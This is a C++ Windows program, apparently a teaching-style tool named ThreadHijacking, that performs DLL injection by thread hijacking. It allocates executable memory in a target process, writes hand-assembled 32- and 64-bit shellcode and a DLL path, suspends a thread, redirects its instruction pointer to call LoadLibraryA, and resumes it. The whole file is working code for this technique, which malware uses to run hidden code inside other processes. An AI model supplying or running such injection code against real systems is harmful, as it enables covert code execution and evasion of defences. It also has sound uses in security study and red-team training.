#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>

// Custom system error printing function
void PrintError(const char* text)
{
	DWORD err = GetLastError();
	LPSTR buf = nullptr;

	FormatMessageA(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |       // Allocate a buffer, retrieve from system error message, ignore inserts
		FORMAT_MESSAGE_FROM_SYSTEM |           // Get the message from the system's message table
		FORMAT_MESSAGE_IGNORE_INSERTS,         // Do not include insert sequences in the message
		nullptr,                               // lpSource: Pointer to the source; use nullptr for system messages
		err,                                   // dwMessageId: The error code for which we want the message
		0,                                     // dwLanguageId: Use default language
		(LPSTR)&buf,                           // lpBuffer: Allocate a buffer to receive the formatted message
		0,                                     // nSize: Size of the buffer; 0 to use the allocated size
		nullptr);                              // Arguments: Pointer to additional arguments; nullptr if not needed

	if (buf) // strip trailing CR/LF
	{
		char* p = buf;
		while (*p && (*p != '\r') && (*p != '\n')) ++p;
		*p = '\0';
	}

	printf("%s (0x%lX: %s)\n", text, err, buf ? buf : "<unknown>");    // Print system error code with it's description
	LocalFree(buf);                          // hMem: Pointer to the memory to be freed; frees the allocated buffer from FormatMessage
}

#ifndef _WIN64  // Checks if the code is being compiled for a platform that is not 64-bit Windows
// Dummy values in this shellcode will be changed to the actual pointer to the LoadLibraryA function, dynamically
void __declspec(naked) InjectedFunction() {
	__asm {   // Inline Assembly
		pushad						// Push all the registers
		push        11111111h       // Dummy value, should be the path to our DLL for LoadLibraryA Function
		mov         eax, 22222222h  // Dummy value, should be a proper pointer to LoadLibraryA Function
		call        eax				// Should call LoadLibraryA function
		popad						// Pop all the registers
		push        33333333h       // Dummy value, should be the address we want to thread return to
		ret
	}
}
#endif

bool DoInjection(HANDLE hProcess, HANDLE hThread, PCSTR dllPath) {
#ifdef _WIN64
	// Binary representation of the shellcode for 64-bits Windows
	BYTE code[] = {
		0x48, 0x83, 0xec, 0x28,   // sub rsp, 28h
		0x48, 0x89, 0x44, 0x24, 0x18,   // mov [rsp + 18], rax
		0x48, 0x89, 0x4c, 0x24, 0x10,   // mov [rsp + 10h], rcx
		0x48, 0xb9, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,   // mov rcx, 11111111111111111h
		0x48, 0xb8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,   // mov rax, 22222222222222222h
		0xff, 0xd0,   // call rax
		0x48, 0x8b, 0x4c, 0x24, 0x10,   // mov rcx, [rsp + 10h]
		0x48, 0x8b, 0x44, 0x24, 0x18,   // mov rax, [rsp + 18h]
		0x48, 0x83, 0xc4, 0x28,   // add rsp, 28h
		0x49, 0xbb, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,   // mov r11, 333333333333333333h
		0x41, 0xff, 0xe3   // jmp r11
	};
#else
	// Binary representation of the shellcode for 32-bits Windows
	BYTE code[] = {
		0x60,						    // pushad
		0x68, 0x11, 0x11, 0x11, 0x11,   // push        11111111h
		0xb8, 0x22, 0x22, 0x22, 0x22,   // mov         eax, 22222222h
		0xff, 0xd0,						// call        eax
		0x61,							// popad
		0x68, 0x33, 0x33, 0x33, 0x33,   // push        33333333h
		0xc3							// ret
	};
#endif

	const int page_size = 1 << 12;  // size of a memory page (4 KB)

	// allocate buffer in the target process to hold DLL path and injected function code
	auto buffer = (char*)VirtualAllocEx(
		hProcess,                   // hProcess: Handle to the target process where memory will be allocated
		nullptr,                    // lpAddress: Pointer to the starting address for allocation (nullptr for automatic allocation)
		page_size,                  // dwSize: Size of memory to allocate (4KB)
		MEM_COMMIT | MEM_RESERVE,   // flAllocationType: Commit memory to make it accessible | Reserve the memory range
		PAGE_EXECUTE_READWRITE      // flProtect: Memory protection attribute allowing execution, reading, and writing
	);
	if (!buffer)
		return false;

	// Suspend the target thread
	if (SuspendThread(hThread) == -1)
		return false;

	CONTEXT context;   // Declare a CONTEXT structure to hold the thread's context
	context.ContextFlags = CONTEXT_FULL;   // Specify which parts of the context to retrieve
	if (!GetThreadContext(
		hThread,				 // hThread: Handle to the thread whose context is to be retrieved
		&context				 // lpContext: Pointer to a CONTEXT structure that receives the thread's context
	)) {
		ResumeThread(hThread);   // Resume the thread before exiting due to failure
		return false;
	}

	// Obtain the address of the LoadLibraryA function from kernel32.dll
	void* loadLibraryAddress = GetProcAddress(
		GetModuleHandle(L"kernel32.dll"),  // hModule: Handle to the loaded module (kernel32.dll) from which to retrieve the function address
		"LoadLibraryA"                     // lpProcName: Name of the function to retrieve the address for (LoadLibraryA)
	);

#ifdef _WIN64   // For 64-bits operation
	// Set the DLL path in the appropriate location within the injection code
	* (PVOID*)(code + 0x10) = (void*)(buffer + page_size / 2); // Set the DLL path to the middle of the allocated buffer

	// Set the address of LoadLibraryA in the injection code
	*(PVOID*)(code + 0x1a) = loadLibraryAddress; // Insert the address of LoadLibraryA for function invocation

	// Set the jump address back to the original instruction after injection
	*(unsigned long long*)(code + 0x34) = context.Rip; // Use Rip register (instruction pointer) for the return address in 64-bit
#else   // For 32-bits operation
	// Set the DLL path in the appropriate location within the injection code
	* (PVOID*)(code + 2) = (void*)(buffer + page_size / 2); // Set the DLL path to the middle of the allocated buffer

	// Set the address of LoadLibraryA in the injection code
	*(PVOID*)(code + 7) = loadLibraryAddress; // Insert the address of LoadLibraryA for function invocation

	// Set the jump address back to the original instruction after injection
	*(unsigned*)(code + 0xf) = context.Eip; // Use Eip register (instruction pointer) for the return address in 32-bit
#endif

	// Copy the injected function into the allocated buffer in the target process
	if (!WriteProcessMemory(
		hProcess,               // hProcess: Handle to the target process where memory will be written
		buffer,                 // lpBaseAddress: Pointer to the allocated buffer in the target process
		code,                   // lpBuffer: Pointer to the buffer containing the code to be written
		sizeof(code),           // dwSize: Size of the code to write (calculated based on the size of the code array)
		nullptr                 // lpNumberOfBytesWritten: Optional pointer to receive the number of bytes written (not needed here)
	)) {
		ResumeThread(hThread);  // Resume the thread if writing memory fails
		return false;
	}

	// Copy the DLL name into the allocated buffer in the target process
	if (!WriteProcessMemory(
		hProcess,               // hProcess: Handle to the target process where memory will be written
		buffer + page_size / 2, // lpBaseAddress: Pointer to the location in the buffer where the DLL name will be written (middle of the buffer)
		dllPath,                // lpBuffer: Pointer to the buffer containing the DLL name to be injected
		strlen(dllPath),        // dwSize: Size of the DLL name string (length in bytes)
		nullptr                 // lpNumberOfBytesWritten: Optional pointer to receive the number of bytes written (not needed here)
	)) {
		ResumeThread(hThread);  // Resume the thread if writing memory fails
		return false;
	}


	// Change the thread context to point to the injected code
#ifdef _WIN64   // For 64-bit operation
	context.Rip = (unsigned long long)buffer; // Set Rip register to the address of the injected code for 64-bit systems
#else   // For 32-bit operation
	context.Eip = (DWORD)buffer; // Set Eip register to the address of the injected code for 32-bit systems
#endif

	// Set the modified thread context in the target thread
	if (!SetThreadContext(
		hThread,              // hThread: Handle to the thread whose context is to be set
		&context              // lpContext: Pointer to a CONTEXT structure containing the new context to set for the thread
	))
		return false;

	ResumeThread(hThread);    // Resume the execution of the suspended thread
	return true;
}

int GetFirstThreadInProcess(int pid) {
	auto hSnapshot = CreateToolhelp32Snapshot(
		TH32CS_SNAPTHREAD,   // dwFlags: Specifies the types of objects to include in the snapshot (in this case, THREADs)
		0                    // th32ProcessID: Identifier of the process to be included in the snapshot (0 means all processes)
	);

	// Check if the snapshot was created successfully
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return 0;

	// Initialize THREADENTRY32 structure to hold thread information
	THREADENTRY32 te = { sizeof(te) };

	// Retrieve information about the first thread in the snapshot
	if (!Thread32First(
		hSnapshot,                // hSnapshot: Handle to the snapshot of threads created by CreateToolhelp32Snapshot
		&te                       // lpte: Pointer to a THREADENTRY32 structure that receives information about the first thread in the snapshot
	)) {
		CloseHandle(hSnapshot);   // Close the snapshot handle if retrieval failed
		return 0;
	}

	// Initialize thread ID variable to store the result
	int tid = 0;
	do {
		// Check if the thread belongs to the specified process
		if (te.th32OwnerProcessID == pid) {
			tid = te.th32ThreadID;   // Assign the thread ID if the owner process matches
			break;
		}
	} while (Thread32Next(hSnapshot, &te));   // Continue to the next thread in the snapshot

	CloseHandle(hSnapshot);   // Close the snapshot handle to release resources
	return tid;
}

int main(int argc, char* argv[]) {
	if (argc < 3) {
		printf("Usage: ThreadHijacking <pid> <dllPath>\n");
		return 0;
	}

	// Convert the first command-line argument (argv[1]) from a string to an integer (pid)
	auto pid = atoi(argv[1]);

	// Open a handle to the target process with specified access rights
	auto hProcess = OpenProcess(
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE,  // dwDesiredAccess: Combination of access rights for the process (allows memory operations and writing)
		FALSE,                                    // bInheritHandle: Specifies whether the handle is inheritable (FALSE means it cannot be inherited)
		pid                                       // dwProcessId: The identifier of the target process for which the handle is being opened
	);
	if (!hProcess)
		PrintError("Failed to open process handle");

	// Call the function to get the first thread ID of the specified process (pid) and store it in the tid variable
	DWORD tid = GetFirstThreadInProcess(pid);

	// Open a handle to the specified thread with the necessary access rights
	auto hThread = OpenThread(
		THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT, // dwDesiredAccess: Combination of access rights for the thread
		FALSE,                                                           // bInheritHandle: Specifies whether the handle is inheritable (FALSE means it cannot be inherited)
		tid                                                              // dwThreadId: The identifier of the target thread for which the handle is being opened
	);
	if (!hThread)
		PrintError("Failed to open thread");

	// Call the DoInjection function, passing the process handle, thread handle, and the DLL path to perform DLL injection
	if (!DoInjection(hProcess, hThread, argv[argc - 1]))
		PrintError("Failed to inject DLL");

	// Wake up the thread if it has a user interface by posting a message to it
	PostThreadMessage(
		tid,        // idThread: The identifier of the thread to which the message will be posted (thread ID)
		WM_NULL,    // Msg: The message identifier (WM_NULL is typically used to wake up a thread without sending specific data)
		0,          // wParam: Additional message-specific information (0 in this case, as no extra data is needed)
		0           // lParam: Additional message-specific information (0 in this case, as no extra data is needed)
	);

	CloseHandle(hThread);   // Close the handle to the thread to release resources
	CloseHandle(hProcess);  // hProcess: Handle to the process that is no longer needed

	return 0;
}
